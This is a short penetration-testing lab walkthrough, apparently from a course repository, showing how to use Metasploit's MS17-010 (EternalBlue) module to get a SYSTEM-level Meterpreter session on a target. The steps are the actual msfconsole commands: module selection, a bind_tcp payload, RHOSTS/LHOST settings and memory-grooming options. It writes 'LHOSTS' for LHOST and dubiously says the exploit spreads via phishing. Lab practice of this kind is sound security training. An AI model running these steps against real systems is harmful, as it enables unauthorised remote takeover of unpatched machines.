# Use Metasploit To Exploit MS17-010
The EternalBlue exploit targets a vulnerability in the Server Message Block (SMB) protocol, which was patched with the MS17-010 update. However, many systems remain unpatched, leaving them susceptible to this attack. The exploit can be delivered via phishing emails or malicious websites. Penetration testers can use Metasploit to identify hosts vulnerable to the EternalBlue exploit by scanning for the MS17-010 flaw. Once a vulnerable system is found, the tester can deploy and execute a malicious payload on the target using Metasploit.

## Tasks
- Execute the appropriate MS17-010 exploit from Metasploit against the target machine to exploit the vulnerability
- Use the "getuid" command within the Meterpreter session
- After successful exploitation, verify that you have gained a Meterpreter session
- Demonstrate you are running as "NT AUTHORITY\SYSTEM" when executing "getuid" within the Meterpreter session

## Practical Approach
1. Launch Metasploit in Kali Linux with the command `msfconsole`
2. Run the command `search ms17-010`
3. Choose a module. For automatic modules, simply enter `use 0`. Note that since no payload was configured, it defaults to `windows/x64/meterpreter/reverse_tcp`
4. Enter `show payloads`, and choose a payload number 26 `payload/windows/x64/meterpreter/bind_tcp_rc4` using `set payload 26`
5. To set the target's IP address, enter `show options` and `set RHOSTS <target_IP_address>`
6. Ensure the local machine's IP address is correct, otherwise set it using the `set LHOSTS <local_ip_address>` command
7. (Optional) Enter `set GroomAllocations 10` and `set GroomDelta 5` for controlling how memory is arranged on the target computer during an exploit. GroomAllocations decides how many memory spaces the exploit creates to prepare the computer's memory, while GroomDelta fine-tunes the size of the memory spaces

Screenshot of Metasploit successfully exploiting MS17-010 vulnerability with an active Meterpreter session shown below: <br/>
![image](https://github.com/user-attachments/assets/6c8cfafb-7834-4b86-8c90-dbfe87114ffe)
